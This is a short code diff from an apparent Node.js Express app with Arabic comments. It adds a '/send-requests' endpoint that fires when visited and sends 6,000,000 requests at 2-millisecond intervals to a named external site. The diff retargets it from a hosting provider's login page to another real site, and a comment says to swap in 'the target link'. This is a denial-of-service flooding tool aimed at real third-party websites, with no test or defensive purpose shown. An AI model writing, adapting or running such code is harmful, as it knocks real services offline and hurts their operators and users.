@@ -23,7 +23,7 @@ const sendRequests = async (url, times, interval) => {
 // نقطة النهاية تعمل تلقائيًا عند زيارة الرابط
 app.get("/send-requests", async (req, res) => {
   const targetUrl =
-    "https://my.libyanspider.com/index.php?rp=%2Flogin&language=english"; // استبدلها بالرابط الهدف
+    "http://chaat.ly/"; // استبدلها بالرابط الهدف
   const totalRequests = 6000000; // عدد الطلبات
   const requestInterval = 2; // الفاصل الزمني بين الطلبات (بالملي ثانية)
 
